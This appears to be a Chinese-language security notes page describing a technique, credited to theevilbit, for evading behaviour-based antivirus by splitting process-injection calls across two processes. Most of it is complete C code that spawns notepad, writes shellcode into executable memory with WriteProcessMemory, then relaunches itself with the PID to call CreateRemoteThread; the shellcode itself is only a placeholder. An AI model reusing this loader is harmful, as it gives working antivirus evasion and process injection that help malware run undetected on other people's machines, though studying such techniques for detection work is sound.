# Divide and Conquer

##  简介

看到了一种比较有意思的手法，现在的杀软会关注函数的执行链， [theevilbit](https://gist.github.com/theevilbit)公开了一种通过不同进程分离执行API，绕过基于行为的AV检测。

## 流程

1. 创建傀儡进程
2. 向傀儡进程写入payload
3. 创建同文件进程传入pid
4. 通过pid打开傀儡句柄
5. 创建远程线程

## 代码

```text


#include <stdio.h>
#include <windows.h>
unsigned char shellcode[] =
"\xfc78\x00";

int main(int argc, char* argv[]) {

    if (argv[1]==NULL)
    {
        STARTUPINFOA si = { 0 };
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi = { 0 };

        CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
        VirtualAllocEx(pi.hProcess, (PVOID)0x0000480000000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(pi.hProcess, (PVOID)0x0000480000000000, shellcode, sizeof(shellcode), NULL);

        char cmd[MAX_PATH] = {0};
        wsprintfA(cmd, "%s %d", argv[0], pi.dwProcessId);

        CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
    }
    else
    {
        HANDLE hProcess =  OpenProcess(PROCESS_ALL_ACCESS, NULL, atoi(argv[1]));
        CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)0x0000480000000000, 0, 0, 0);
    }
    
    
    return 0;
}

```

![](../.gitbook/assets/image%20%28241%29.png)

